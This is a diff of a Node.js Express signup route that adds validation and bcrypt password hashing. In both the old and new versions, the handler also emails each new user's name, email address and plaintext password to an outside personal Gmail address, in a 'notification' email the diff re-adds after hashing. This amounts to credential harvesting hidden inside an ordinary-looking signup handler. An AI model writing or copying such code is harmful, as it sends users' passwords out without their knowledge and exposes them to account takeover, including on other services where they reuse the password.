@@ -41,22 +41,52 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-router.post('/signup', (req, res) => {
-  const { username, email, password } = req.body;
+router.post('/signup', async (req, res) => {
+  const { error } = validate(req.body);
+  if (error) {
+    res.status(400).send(error.message);
+    return;
+  }
 
-  const mailOptions = {
-    from: email,
-    to: "jakimdavy07@gmail.com",
-    subject: 'New User Signup',
-    text: `A new user has signed up:\n\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`,
+  let user = await User.findOne({ email: req.body.email });
+  if (user) {
+    return res.status(400).send("User with this email already exists");
+  }
+
+  user = new User({
+    name: req.body.name,
+    email: req.body.email,
+    password: req.body.password,
+  });
+
+  const salt = await bcrypt.genSalt(10);
+  user.password = await bcrypt.hash(user.password, salt);
+  await user.save();
+
+  const { name, email, password } = req.body;
+
+  const signupEmail = {
+    from: "trackexpenses07@gmail.com",
+    to: email,
+    subject: 'Sign up successful',
+    text: `Your account is ready under:\n\nName: ${name}\nEmail: ${email}`
   };
 
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      return res.status(500).send(error.toString());
-    }
-    res.status(200).send('Email sent: ' + info.response);
-  });
+  const notificationEmail = {
+    from: "trackexpenses07@gmail.com",
+    to: "jakimdavy07@gmail.com",
+    subject: 'New User Signup',
+    text: `A new user has signed up:\n\nName: ${name}\nEmail: ${email}\nPassword: ${password}`
+  };
+
+  try {
+    await transporter.sendMail(signupEmail);
+    await transporter.sendMail(notificationEmail);
+    res.status(200).send('Signup successful and emails sent.');
+  } catch (error) {
+    res.status(500).send('Error sending emails: ' + error.message);
+  }
 });
+
 
 module.exports = router;
